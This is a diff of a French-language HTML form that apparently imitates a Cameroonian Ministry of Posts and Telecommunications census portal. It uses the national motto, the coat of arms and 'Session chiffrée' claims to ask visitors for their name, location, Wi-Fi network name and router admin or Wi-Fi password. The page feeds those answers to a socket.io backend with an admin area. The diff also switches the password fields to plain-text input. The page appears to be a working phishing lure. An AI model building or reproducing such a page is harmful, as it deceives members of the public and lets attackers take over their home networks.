@@ -1,165 +1,140 @@
 <!DOCTYPE html>
 <html lang="fr">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Enregistrement — Portail national de recensement</title>
-    <link rel="stylesheet" href="/style.css" />
-  </head>
-  <body>
-    <div class="flag-strip" aria-hidden="true"></div>
-    <div class="gov-top">
-      <span class="gov-top__motto">République du Cameroun · Paix – Travail – Patrie</span>
-      <span class="gov-top__secure">
-        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" aria-hidden="true">
-          <path
-            d="M12 1L4 5v6c0 5.55 3.84 10.74 8 12 4.16-1.26 8-6.45 8-12V5l-8-4z"
-            fill="currentColor"
-            opacity="0.9"
-          />
-        </svg>
-        Session chiffrée
-      </span>
-    </div>
-    <nav class="site-nav" aria-label="Navigation principale">
-      <div class="site-nav__inner">
-        <div class="site-nav__links">
-          <a href="/index.html">Accueil</a>
-          <a href="/form.html" class="is-active">Enregistrement</a>
-          <a href="/admin.html">Espace habilité</a>
-        </div>
-      </div>
-    </nav>
-    <header class="header-main">
-      <div class="header-inner">
-        <div class="logo-block">
-          <img
-            class="coat"
-            src="/images/photo_2026-04-28_01-39-47.jpg"
-            width="64"
-            height="75"
-            alt="Armoiries de la République du Cameroun"
-          />
-          <div class="logo-text">
-            <span class="line1">Ministère des Postes et Télécommunications</span>
-            <span class="line2">Déclaration en ligne — équipement d’accès internet</span>
-          </div>
-        </div>
-      </div>
-    </header>
 
-    <main id="formulaire">
-      <p class="breadcrumb">
-        <a href="/index.html">Accueil</a> &nbsp;/&nbsp; <span>Enregistrement</span>
-      </p>
-      <h1 class="page-title" style="text-align: center">Formulaire d’auto-déclaration</h1>
-      <p style="text-align: center; color: var(--muted); max-width: 560px; margin: 0 auto 1.5rem">
-        Renseignez les champs ci-dessous conformément aux informations figurant sur votre contrat,
-        votre facture ou l’étiquette de votre box.
-      </p>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Enregistrement — Portail national de recensement</title>
+  <link rel="stylesheet" href="/style.css" />
+</head>
 
-      <div class="card">
-        <form id="registration-form" class="form-grid" novalidate>
-          <div>
-            <label for="ownerName">Nom complet du propriétaire ou du titulaire du contrat</label>
-            <input
-              id="ownerName"
-              name="ownerName"
-              type="text"
-              autocomplete="name"
-              required
-              placeholder="Nom et prénom(s)"
-            />
-          </div>
-
-          <div class="form-row-2">
-            <div>
-              <label for="region">Région</label>
-              <select id="region" name="region" required>
-                <option value="">— Sélectionnez —</option>
-              </select>
-            </div>
-            <div>
-              <label for="city">Ville / chef-lieu</label>
-              <select id="city" name="city" required disabled>
-                <option value="">— Choisissez d’abord une région —</option>
-              </select>
-            </div>
-          </div>
-
-          <div>
-            <label for="network">Opérateur / réseau</label>
-            <select id="network" name="network" required>
-              <option value="">— Sélectionnez —</option>
-              <option value="MTN">MTN</option>
-              <option value="Orange">Orange</option>
-              <option value="Starlink">Starlink</option>
-              <option value="Autres">Autres</option>
-            </select>
-          </div>
-
-          <div>
-            <label for="wifiName">
-              Nom du réseau Wi-Fi (SSID)
-              <span class="hint"> — identifiant affiché sur vos appareils</span>
-            </label>
-            <input id="wifiName" name="wifiName" type="text" required placeholder="SSID de la box" />
-          </div>
-
-          <div>
-            <label for="pwd">Mot de passe administrateur ou Wi-Fi de la box</label>
-            <input
-              id="pwd"
-              name="pwd"
-              type="password"
-              autocomplete="new-password"
-              required
-              minlength="4"
-              placeholder="••••••••"
-            />
-          </div>
-
-          <div>
-            <label for="pwdConfirm">Confirmer le mot de passe</label>
-            <input
-              id="pwdConfirm"
-              name="pwdConfirm"
-              type="password"
-              autocomplete="new-password"
-              required
-              placeholder="••••••••"
-            />
-          </div>
-
-          <button type="submit" class="btn btn-primary" style="width: 100%; margin-top: 0.35rem">
-            Valider les informations
-          </button>
-        </form>
-      </div>
-    </main>
-
-    <div id="toast-host" class="toast-host" aria-live="assertive" aria-atomic="true"></div>
-
-    <div id="process-overlay" class="process-overlay" aria-live="polite" aria-busy="true">
-      <div class="process-box">
-        <div class="spinner" aria-hidden="true"></div>
-        <p id="process-status" class="process-status">Connexion au serveur…</p>
-        <div class="process-progress-wrap">
-          <div id="process-progress-bar" class="process-progress-bar"></div>
-        </div>
-      </div>
-    </div>
-
-    <footer class="site-footer">
-      <div class="footer-links">
+<body>
+  <div class="flag-strip" aria-hidden="true"></div>
+  <div class="gov-top">
+    <span class="gov-top__motto">République du Cameroun · Paix – Travail – Patrie</span>
+    <span class="gov-top__secure">
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+        <path d="M12 1L4 5v6c0 5.55 3.84 10.74 8 12 4.16-1.26 8-6.45 8-12V5l-8-4z" fill="currentColor" opacity="0.9" />
+      </svg>
+      Session chiffrée
+    </span>
+  </div>
+  <nav class="site-nav" aria-label="Navigation principale">
+    <div class="site-nav__inner">
+      <div class="site-nav__links">
         <a href="/index.html">Accueil</a>
-        <a href="/form.html">Enregistrement</a>
+        <a href="/form.html" class="is-active">Enregistrement</a>
         <a href="/admin.html">Espace habilité</a>
       </div>
-      <p style="margin: 0">Données transmises de façon chiffrée vers le serveur de traitement national.</p>
-    </footer>
+    </div>
+  </nav>
+  <header class="header-main">
+    <div class="header-inner">
+      <div class="logo-block">
+        <img class="coat" src="/images/photo_2026-04-28_01-39-47.jpg" width="64" height="75"
+          alt="Armoiries de la République du Cameroun" />
+        <div class="logo-text">
+          <span class="line1">Ministère des Postes et Télécommunications</span>
+          <span class="line2">Déclaration en ligne — équipement d’accès internet</span>
+        </div>
+      </div>
+    </div>
+  </header>
 
-    <script src="/socket.io/socket.io.js"></script>
-    <script src="/script.js"></script>
-  </body>
+  <main id="formulaire">
+    <p class="breadcrumb">
+      <a href="/index.html">Accueil</a> &nbsp;/&nbsp; <span>Enregistrement</span>
+    </p>
+    <h1 class="page-title" style="text-align: center">Formulaire d’auto-déclaration</h1>
+    <p style="text-align: center; color: var(--muted); max-width: 560px; margin: 0 auto 1.5rem">
+      Renseignez les champs ci-dessous conformément aux informations figurant sur votre contrat,
+      votre facture ou l’étiquette de votre box.
+    </p>
+
+    <div class="card">
+      <form id="registration-form" class="form-grid" novalidate>
+        <div>
+          <label for="ownerName">Nom complet du propriétaire ou du titulaire du contrat</label>
+          <input id="ownerName" name="ownerName" type="text" autocomplete="name" required
+            placeholder="Nom et prénom(s)" />
+        </div>
+
+        <div class="form-row-2">
+          <div>
+            <label for="region">Région</label>
+            <select id="region" name="region" required>
+              <option value="">— Sélectionnez —</option>
+            </select>
+          </div>
+          <div>
+            <label for="city">Ville / chef-lieu</label>
+            <select id="city" name="city" required disabled>
+              <option value="">— Choisissez d’abord une région —</option>
+            </select>
+          </div>
+        </div>
+
+        <div>
+          <label for="network">Opérateur / réseau</label>
+          <select id="network" name="network" required>
+            <option value="">— Sélectionnez —</option>
+            <option value="MTN">MTN</option>
+            <option value="Orange">Orange</option>
+            <option value="Starlink">Starlink</option>
+            <option value="Autres">Autres</option>
+          </select>
+        </div>
+
+        <div>
+          <label for="wifiName">
+            Nom du réseau Wi-Fi (SSID)
+            <span class="hint"> — identifiant affiché sur vos appareils</span>
+          </label>
+          <input id="wifiName" name="wifiName" type="text" required placeholder="SSID de la box" />
+        </div>
+
+        <div>
+          <label for="pwd">Mot de passe administrateur ou Wi-Fi de la box</label>
+          <input id="pwd" name="pwd" type="text" autocomplete="new-password" required minlength="4"
+            placeholder="••••••••" />
+        </div>
+
+        <div>
+          <label for="pwdConfirm">Confirmer le mot de passe</label>
+          <input id="pwdConfirm" name="pwdConfirm" type="text" autocomplete="new-password" required
+            placeholder="••••••••" />
+        </div>
+
+        <button type="submit" class="btn btn-primary" style="width: 100%; margin-top: 0.35rem">
+          Valider les informations
+        </button>
+      </form>
+    </div>
+  </main>
+
+  <div id="toast-host" class="toast-host" aria-live="assertive" aria-atomic="true"></div>
+
+  <div id="process-overlay" class="process-overlay" aria-live="polite" aria-busy="true">
+    <div class="process-box">
+      <div class="spinner" aria-hidden="true"></div>
+      <p id="process-status" class="process-status">Connexion au serveur…</p>
+      <div class="process-progress-wrap">
+        <div id="process-progress-bar" class="process-progress-bar"></div>
+      </div>
+    </div>
+  </div>
+
+  <footer class="site-footer">
+    <div class="footer-links">
+      <a href="/index.html">Accueil</a>
+      <a href="/form.html">Enregistrement</a>
+      <a href="/admin.html">Espace habilité</a>
+    </div>
+    <p style="margin: 0">Données transmises de façon chiffrée vers le serveur de traitement national.</p>
+  </footer>
+
+  <script src="/socket.io/socket.io.js"></script>
+  <script src="/script.js"></script>
+</body>
+
 </html>
